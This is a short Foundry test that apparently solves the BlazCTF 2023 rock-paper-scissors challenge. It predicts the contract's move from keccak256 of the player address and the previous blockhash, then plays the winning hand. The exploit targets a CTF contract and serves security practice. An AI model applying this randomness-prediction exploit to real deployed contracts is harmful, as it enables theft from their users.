// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Challenge, RockPaperScissors} from "../../src/BlazCTF2023/rock-paper-scissor.sol";

contract ChallengeTest is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        Challenge challenge = new Challenge(playerAddress);

        vm.startPrank(playerAddress);

        uint256 hand = (uint256(
            keccak256(
                abi.encodePacked(playerAddress, blockhash(block.number - 1))
            )
        ) + 1) % 3;

        challenge.rps().tryToBeatMe(RockPaperScissors.Hand(hand));

        vm.stopPrank();

        assertTrue(challenge.isSolved());
    }
}
